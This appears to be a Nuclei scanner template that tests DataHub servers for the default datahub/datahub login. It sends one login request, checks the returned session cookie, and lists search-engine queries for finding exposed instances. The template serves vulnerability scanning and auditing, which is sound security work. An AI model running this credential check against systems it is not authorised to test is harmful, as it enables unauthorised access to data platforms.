id: datahub-metadata-default-login

info:
  name: DataHub Metadata Default Credentials
  author: queencitycyber
  severity: high
  description: DataHub Metadata default login credentials were discovered.
  reference:
    - https://github.com/datahub-project/datahub/blob/master/docs/rfc/active/access-control/access-control.md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:datahub_project:datahub:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: datahub_project
    product: datahub
    shodan-query: http.title:"datahub"
    fofa-query: title="datahub"
    google-query: intitle:"datahub"
    runzero-match: any(each(service["html.titles"]), {# matches "DataHub"})
  tags: datahub,default-login

http:
  - raw:
      - |
        POST /logIn HTTP/2
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - datahub
      password:
        - datahub

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'Set-Cookie: actor=urn:li:corpuser:datahub;'

      - type: status
        status:
          - 200

